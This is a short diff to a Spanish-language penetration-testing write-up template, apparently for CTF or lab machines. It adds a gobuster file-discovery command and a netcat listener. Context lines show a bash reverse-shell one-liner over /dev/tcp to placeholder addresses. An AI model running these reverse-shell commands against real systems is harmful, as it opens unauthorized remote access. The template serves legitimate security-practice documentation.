@@ -76,6 +76,11 @@ gobuster dir -u http://[IP_TARGET]/[Ruta] -w [Diccionario] -t [Hilos] [Opciones_
 - `[Ruta_Importante]`: [Descripción]
 - `[Ruta_Importante]`: [Descripción]
 
+### Descubrimiento de Archivos
+```bash
+gobuster dir -u http://[IP_TARGET]/[Ruta] -w [Diccionario] -t [Hilos] -x [Extensiones]
+```
+
 - **Hallazgos**:
 ```bash
 /admin (Status: 200) [Size: 1534]
@@ -98,6 +103,11 @@ gobuster dir -u http://[IP_TARGET]/[Ruta] -w [Diccionario] -t [Hilos] [Opciones_
 ```
 
 ### Intrusion
+Modo escucha
+```bash
+nc -nlvp PORT
+```
+
 ```bash
 # Reverse shell o acceso inicial
 bash -c 'exec bash -i &>/dev/tcp/IP_TARGE/PORT <&1'
